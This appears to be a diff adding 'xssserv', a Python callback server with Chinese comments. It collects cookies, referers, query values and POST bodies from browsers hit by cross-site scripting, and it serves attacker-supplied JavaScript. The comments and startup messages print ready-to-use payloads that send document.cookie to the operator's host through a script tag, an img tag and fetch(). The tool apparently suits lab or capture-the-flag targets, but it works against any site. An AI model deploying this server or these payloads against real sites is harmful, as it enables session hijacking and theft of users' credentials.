@@ -1,0 +1,103 @@
+#!/usr/bin/env python3
+# xssserv -- XSS 回调接收服务器（零依赖：python3 stdlib）
+# 用途: 靶机浏览器访问 XSS 时回连, 记录 cookie/路径/来源; 支持注入自定义 JS
+# 用法:
+#   xssserv [--port 8000] [--out 记录文件] [--page 'alert(document.cookie)']
+# 注入 payload 示例:
+#   <script src="http://LHOST:8000/x.js"></script>
+#   <script>document.write('<img src=http://LHOST:8000/c?c='+document.cookie+'>')</script>
+
+import argparse
+import datetime
+import http.server
+import os
+import sys
+import urllib.parse
+
+
+class Handler(http.server.BaseHTTPRequestHandler):
+    server_version = "xssserv/1.0"
+
+    def log_message(self, fmt, *args):
+        pass
+
+    def _record(self, body=b""):
+        ts = datetime.datetime.now().strftime("%H:%M:%S")
+        q = urllib.parse.parse_qs(urllib.parse.urlsplit(self.path).query)
+        line = f"[{ts}] {self.client_address[0]} {self.command} {self.path}"
+        extra = ""
+        cookie = self.headers.get("Cookie")
+        ref = self.headers.get("Referer")
+        if cookie:
+            line += f"\n    Cookie: {cookie}"
+        if ref:
+            line += f"\n    Referer: {ref}"
+        for k, v in q.items():
+            if k.lower() in ("c", "cookie", "flag", "data", "x"):
+                line += f"\n    {k} = {v[0]}"
+        if body and body[:4] not in (b"%PDF",):
+            text = body[:400].decode("utf-8", "replace")
+            if text.strip():
+                line += f"\n    Body: {text}"
+        print(line, flush=True)
+        if self.server.out_file:
+            with open(self.server.out_file, "a") as f:
+                f.write(line + "\n")
+
+    def do_GET(self):
+        self._record()
+        path = urllib.parse.urlsplit(self.path).path
+        if path.endswith(".js") or path.endswith(".x.js") or self.server.inject_all:
+            body = self.server.js.encode()
+            self.send_response(200)
+            self.send_header("Content-Type", "application/javascript")
+            self.send_header("Access-Control-Allow-Origin", "*")
+            self.end_headers()
+            self.wfile.write(body)
+        else:
+            body = b"<html><body><h1>xssserv</h1><p>callback received. check terminal.</p></body></html>"
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html")
+            self.end_headers()
+            self.wfile.write(body)
+
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0) or 0)
+        body = self.rfile.read(length) if length else b""
+        self._record(body)
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"ok")
+
+
+def main():
+    ap = argparse.ArgumentParser(prog="xssserv", description="XSS 回调接收服务器(零依赖)")
+    ap.add_argument("--port", type=int, default=8000)
+    ap.add_argument("--out", default="", help="记录文件")
+    ap.add_argument("--page", default="", help="返回给请求方的 JS(默认空, 即不执行)")
+    ap.add_argument("--all", action="store_true", help="所有请求都返回 JS 而非 HTML")
+    args = ap.parse_args()
+
+    class Server(http.server.ThreadingHTTPServer):
+        js = args.page
+        out_file = args.out
+        inject_all = args.all
+
+    try:
+        server = Server(("0.0.0.0", args.port), Handler)
+    except OSError as e:
+        sys.exit(f"[-] 端口 {args.port} 绑定失败: {e}")
+
+    print(f"[*] xssserv 监听 0.0.0.0:{args.port}")
+    if args.page:
+        print(f"[*] JS payload: <script src='http://<你的IP>:{args.port}/x.js'></script>")
+        print(f"[*] 或直接: <script>fetch('http://<你的IP>:{args.port}/c?c='+document.cookie)</script>")
+    print("[*] Ctrl-C 退出")
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print("\n[*] 退出")
+
+
+if __name__ == "__main__":
+    main()
